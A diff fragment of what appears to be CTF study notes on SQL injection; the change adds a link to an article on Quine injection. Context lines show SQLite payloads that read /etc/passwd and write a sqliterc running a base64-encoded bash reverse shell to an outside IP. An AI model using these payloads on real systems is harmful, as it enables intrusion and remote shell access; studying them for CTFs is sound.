@@ -107,6 +107,10 @@ select readfile('/etc/passwd')
 select writefile('/home/ctf/'||(SELECT substr(sqlite_version(),2,1))||'sqliterc',
 (SELECT substr(sqlite_version(),2,1)||'shell echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3Lzg4ODggMD4mMQo=|base64 -d|bash'))
 ```
+
+## Quine 输入=输出
+[『CTF』 一次比赛中的 Quine 注入](https://mp.weixin.qq.com/s/zcUgSo825aXINv_IwIvMdg)
+
 # Python
 
 ```
